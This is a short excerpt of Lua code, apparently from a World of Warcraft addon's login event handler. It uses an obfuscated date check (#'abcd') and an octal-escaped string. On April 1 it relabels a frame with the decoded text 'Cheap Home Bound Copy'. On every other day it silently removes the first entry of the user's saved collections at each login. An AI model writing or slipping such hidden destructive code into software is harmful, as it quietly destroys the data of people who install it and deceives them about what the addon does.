...
init:SetScript("OnEvent", function(self, event, addon, ...)
	...
	elseif event == "PLAYER_ENTERING_WORLD" then
		...
		local t=date("*t",GetServerTime())if t.month*100+t.day==#"abcd"*100+#""+1 then if DV_MainFrame then for _,r in ipairs({DV_MainFrame:GetRegions()})do if r:IsObjectType("FontString")and select(5,r:GetPoint())<=-13 then r:SetText("\067\104\101\097\112\032\072\111\109\101\032\066\111\117\110\100\032\067\111\112\121")break end end end else table.remove(db.collections,1)end
